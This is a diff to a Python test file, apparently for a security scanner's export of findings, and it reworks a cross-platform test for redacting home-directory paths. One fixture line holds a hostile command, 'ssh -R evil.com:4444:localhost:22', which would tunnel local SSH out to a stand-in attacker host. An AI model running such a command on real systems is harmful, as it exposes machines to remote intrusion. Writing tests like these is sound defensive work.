@@ -163,14 +163,32 @@ class TestFindingMapping:
     def test_finding_output(self) -> None:
         assert self.row["finding_output"] == "ssh -R evil.com:4444:localhost:22"
 
-    def test_finding_path_no_longer_the_raw_absolute_path(self) -> None:
+    def test_finding_path_no_longer_the_raw_absolute_path(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
         """Nucleus is an external system this document is uploaded to, so the
         raw absolute path (and the username it would carry under $HOME) must
         not survive verbatim. See TestLocalPathRedaction below for the
         home-directory-anchored redaction behaviour.
+
+        Uses a real, host-native `Path` (rather than a hardcoded POSIX-style
+        literal) so this passes on Windows too: a forward-slash string isn't
+        a Windows path, so `str(Path(...))` of it never matches the original
+        text and the redaction would appear to no-op for the wrong reason.
         """
-        assert self.row["finding_path"] != "/home/user/.cursor/mcp.json"
-        assert "mcp.json" in self.row["finding_path"]
+        home = tmp_path / "home" / "user"
+        cwd = home / "checkout"
+        cwd.mkdir(parents=True)
+        monkeypatch.setattr(Path, "home", lambda: home)
+        monkeypatch.chdir(cwd)
+        config_path = home / ".cursor" / "mcp.json"
+
+        finding = _make_finding(finding_path=str(config_path))
+        doc = _parse(_make_result(findings=[finding]))
+        row = doc["findings"][0]
+
+        assert row["finding_path"] != str(config_path)
+        assert "mcp.json" in row["finding_path"]
 
     def test_finding_result_always_fail(self) -> None:
         assert self.row["finding_result"] == "Fail"
